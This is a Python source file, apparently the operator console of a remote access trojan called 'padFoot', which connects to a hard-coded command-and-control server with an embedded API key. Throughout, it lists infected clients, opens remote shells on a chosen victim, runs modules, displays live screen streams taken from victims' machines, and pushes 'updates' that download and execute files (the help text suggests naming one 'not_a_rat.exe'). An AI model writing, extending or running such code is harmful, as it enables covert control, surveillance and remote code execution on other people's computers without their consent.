import socketio
import threading
import time
import json
import os
import tkinter.messagebox as tkm
import platform
import tkinter as tk


import base64
from PIL import Image, ImageTk
import queue
import io

DEBUG = False #os.environ['DEBUG'] #True/False

match DEBUG:
    case True:
        SERVER = 'https://3000-p0syd0n-padfootserver-14zsp1owg0h.ws-us104.gitpod.io'
    case False:
        SERVER = 'http://posydon.ddns.net:3000'

API_KEY ="WQNV12Vr4bsLEY8VAMdyhpbp1kTewosS7ARe0H47JEfdQcxwjwBokr9p2Xm34qGhm2G6oesk3fLVYsbBKv5hBb79PKNMyDZL2MNSEkTGuVs0SyoCn4dM0MEknHH8vQF9"# os.environ["API_KEY"]#idc if it is leaked whatever
LATE_MODULE_OUTPUT = "log"#os.environ["LATE_MODULE_OUTPUT"] #log/info

# Connect to the Socket.IO server
sio = socketio.Client()
connected = False
waiting = False
selected_target = ""
cached_clients = {}
streams = []
help_text = '''
pF Help Menu
Welcome to pF!
Here are the basic commands:
  
"list":
  lists connected clients as json. The key is the socket id.
"set":
  selects the client you wish to interact with. 
  usage:
    "pF >set 0FUUMOM2nm9YMkjVAAAi"
    where "0FUUMOM2nm9YMkjVAAAi" is a socket id. 
    Socket ids may be found through the "list" command.
    To exit and deselect the client, type "EXIT" or restart the script.
"shell":
  Gives shell access to the client you have selected. To exit shell access, type "EXIT".
  You need to select a client before using this command.
"update":
  Updates the client you have selected.
  Parameters:
    "update <url> <location> <name> <run> <is_script>"

    url : The location of the updated file. "https://hosting.com/myfile.exe"
    location : where to install this file on the client machine. (directory) "~/home/"
    name : what should the file be classed on the client machine. "not_a_rat.exe"
    run : should the file be run on update (will autodelete old file) "True" / "False"
    is_script : is the new file an unbuilt python script. "True" / "False"

'''
class Stream:
    def __init__(self, client):
        self.client = client
        self.root = tk.Tk()
        self.root.title(f"Stream: {self.client}")
        self.label = tk.Label(self.root)
        self.label.pack()
        self.root.protocol("WM_DELETE_WINDOW", self.close_window)  # Bind the close event
        self.image_queue = queue.Queue()  # A queue to hold image updates
        self.update_in_progress = False  # Flag to prevent concurrent updates
        streams.append(self)
        self.schedule_update()
        self.root.mainloop()

    def update(self, image_base64):
        self.image_queue.put(image_base64)

    def schedule_update(self):
        if not self.update_in_progress and not self.image_queue.empty():
            self.update_in_progress = True
            image_base64 = self.image_queue.get()
            image_data = base64.b64decode(image_base64)
            image = Image.open(io.BytesIO(image_data))
            photo = ImageTk.PhotoImage(image)
            self.label.configure(image=photo)
            self.label.image = photo
            self.update_in_progress = False
        self.root.after(100, self.schedule_update)  # Schedule the next update

    def close_window(self):
        self.root.destroy()
        self.kill()

    def kill(self):
        streams.remove(self)


def clear():
    # Check the operating system
    system = platform.system()
    
    if system == "Windows":
        os.system("cls")  # For Windows
    elif system == "Linux":
        os.system("clear")  # For Linux

def connecting_dots_effect():
    global connected

    while not connected:
        print("Connecting", end="")
        for _ in range(3):
            time.sleep(0.1)
            print(".", end="", flush=True)
            time.sleep(0.5)
        clear()

    # Connection is established, display message without clearing the screen
    print("\nConnection established!")

    # Launch the shell function in a new thread
    shell_thread = threading.Thread(target=shell)
    shell_thread.start()

def shell():
    global waiting, selected_target
    clear()
    print("Welcome to padFoot!")
    if DEBUG:
        print(f"debug mode enabled. connected to server: {SERVER}")
    while True:
        if selected_target != "":
            input_prompt = f"pF: {selected_target} >"
        else:
            input_prompt = "pF >"
        command = str(input(input_prompt))
        command_list = command.split(" ")
        command = command_list[0]
        if selected_target != "":
            match command:
                case 'info':
                    waiting = True
                    data = {'target': selected_target}
                    sio.emit('getInfo', data)
                    while waiting:
                        pass
                case 'shell':
                    while True:
                        shellInput = str(input(f"pF/{selected_target} $"))
                        if shellInput == "EXIT":
                            break
                        waiting = True
                        sio.emit('sendCommand', {'command': shellInput, 'target': selected_target, 'module': False})
                        while waiting:
                            pass
                case 'EXIT':
                    selected_target = ""
                    continue
                case 'module':
                    while True:
                        shellInput = str(input(f"pF/{selected_target}/MODULE >"))
                        if shellInput == "EXIT":
                            break
                        waiting = True
                        sio.emit('sendCommand', {'command': shellInput, 'target': selected_target, 'module': True})
                        while waiting:
                            pass
        match command:
            case 'list':
                waiting = True
                sio.emit('getConnectedClients', {'isShell': True})
                while waiting:
                    pass
            case 'set':
                if command_list[1] in cached_clients:
                    selected_target = command_list[1]
            case 'help':
                print(help_text)

@sio.on('establishmentResponse')
def establishmentResponse(data):
    global connected
    if data == 200:
        connected = True
        sio.emit('getConnectedClients', {'isShell': False})
    else:
        connected = False

@sio.on('getInfoResponse')
def getInfoResponse(data):
    global waiting
    print(json.dumps(data, indent=4))
    waiting = False

@sio.on('sendCommandResponse')
def sendCommandResponse(data):
    global waiting
    if data['immediate']:
        print(data['output'])
        waiting = False
    else:
        if data['output'] == 'ended stream':
            #doesnt work yet
            for stream in streams:
                if stream.client == data['id']:
                    stream.kill()
        match LATE_MODULE_OUTPUT:
            case 'log':
                open('log.txt', 'a').write(f'{data["client"]} output for command:\n{data["originalCommand"]}\n\n{data["output"]}\n\n\n\n')
            case 'info':
                tkm.showinfo(f'pF | {data["client"]}', f'{data["client"]} output for command:\n{data["originalCommand"]}\n\n{data["output"]}')

@sio.on('getConnectedClientsResponse')
def shellGetConnectedClientsResponse(data):
    global waiting, cached_clients
    cached_clients = data["connectedClients"]
    if data["isShell"]:
        print(json.dumps(cached_clients, indent=4))
        waiting = False

@sio.on('imageFromClientForwarding')
def imageFromClientForwarding(data):
    global streams
    for stream in streams:
        if stream.client == data['id']:
            stream.update(data['image'])
            return
    new_stream = Stream(data['id'])
    new_stream.update(data['image'])

@sio.on('connect')
def on_connect():
    data = {'client': False, 'apiKey': API_KEY} 
    sio.emit('establishment', data)
    

# Start the connection
sio.connect(SERVER)

start_time = time.time()
dots_thread = threading.Thread(target=connecting_dots_effect)
dots_thread.start()

# Wait for the connection to establish
sio.wait()
